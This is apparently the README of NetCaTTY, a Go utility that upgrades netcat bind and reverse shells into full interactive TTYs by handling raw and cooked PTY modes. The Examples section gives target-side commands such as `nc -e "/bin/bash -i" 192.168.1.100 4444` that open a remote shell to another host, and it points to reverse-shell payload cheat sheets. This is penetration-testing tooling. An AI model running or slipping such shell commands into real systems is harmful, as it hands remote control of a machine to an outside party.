# NetCaTTY

A simple TCP socket utility that gives you a TTY, either by listening or by
connecting to a remote.

## Why do I need a TTY?

It's like comparing a netcat shell to SSH. SSH is able to pass EVERYTHING that
you type to the remote. `Ctrl-C`, `Ctrl-Z` and friends work as expected and you
don't kill your session. The way that SSH achieves that behaviour is by spawning
the target process (shell) inside a PTY (a pseudo-TTY), putting the local
PTY (that your terminal gives you) in "raw mode", where the program is able
to handle all keystrokes, and forwards them to the remote PTY.

## How does this work?

Well it's mostly arcane magic, as TTYs (and by extent PTYs) are an ancient
technology used in teletypes (TeleTYpewriter and Pseudo-TeletYpewriter),
written around the 60s where everyone had no idea what they're doing and
drugs where at their best. So I'm not exactly sure, but I'm gonna try to explain
what I have in my head right now - if you wanna read the real thing and not
what I figured out by trial and error in 2 days,
read [this](http://www.linusakesson.net/programming/tty/index.php).

It's something like a buffer between the running program (`bash -i` lets say)
and the stdin (keyboard?). It has two modes (or more? I saw some weird
flags in termios): raw and cooked.

In cooked mode, the input is buffered line by line, so that `Ctrl-D`,
`Backspace` and other keys can be processed. This is the default mode when
you get input from stdin in your program.

In raw mode on the other hand, everything (or most things?) are passed to the
program (even `Backspace` and `Ctrl-C`) and it handles them itself. Even
character echo is disabled (where every character you type is displayed
on the screen).

So what we need to achieve is a cooked PTY on the remote (so it handles `Ctrl-C`
locally) where will take stdin from us and send stdout to us

The problems on achieving a cooked mode on the remote with the remote shell
are that first of all your local PTY is in cooked mode (so your netcat doesn't
ever receive that `Delete` character, your PTY handles it) and even if you put
your PTY in raw mode, the remote has no PTY at all, as it was spawned by another
process (like `exec`).

So the first problem is kinda trivial, you put your PTY in raw mode - and I say
kinda because nobody has documented this shit enough in a language like Go
or Python.

The second problem is not that easy to solve. You need to open a PTY and spawn
a process inside it like you would do in your terminal (so `bash` and `bash -i`
will work the same, as most programs understand that they're inside a PTY and
start in interactive mode) and proxy your stdin (got from the local raw PTY) to
the remote's cooked PTY stdin, and do the reverse for stdout.

Now this problem is a real pain, cause nobody does that, especially in any
language other than C. I've found solutions to that for some shells
(like `import pty; pty.spawn("bash")` for python) and I've integrated them into
the tool.

## Examples

Please don't hurt puppers or kitties with them!

If you're short on ideas for payloads, check the following:

 - msfvenom
 - [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) by [swisskyrepo](https://github.com/swisskyrepo)
 - [oneliner.sh](https://github.com/operatorequals/oneliner-sh) by [operatorequals](https://github.com/operatorequals) 

### Bind shell

Target machine (with IP 192.168.1.1): `nc -e "/bin/bash -i" -lp 4444`

Your terminal: `./netcatty -a 192.168.1.1:4444`

### Reverse shell

Target machine: `nc -e "/bin/bash -i" 192.168.1.100 4444`

Your terminal (with IP 192.168.1.100): `./netcatty -l :4444`

## Installation

Compile it on your own:

```bash
git clone https://github.com/dzervas/netcatty
cd netcatty
go run netcatty.go -h
```

## Usage

```
Usage of ./netcatty:
  -a string
    	Listen/Connect address in the form of 'ip:port'.
    	Domains, IPv6 as ip and Service as port ('localhost:http') also work. (default ":4444")
  -l	Enable listening mode
  -m	Disable automatic shell detection and TTY spawn on remote
  -n string
    	Network type to use. Known networks are:
    	To connect: tcp, tcp4 (IPv4-only), tcp6 (IPv6-only), unix and unixpacket
    	To listen: tcp, tcp4, tcp6, unix or unixpacket
    	 (default "tcp")
```

---

Credits at [operatorequals](https://github.com/operatorequals) for making me
write this and at [mattn](https://github.com/mattn) for creating [go-tty](https://github.com/mattn/go-tty).
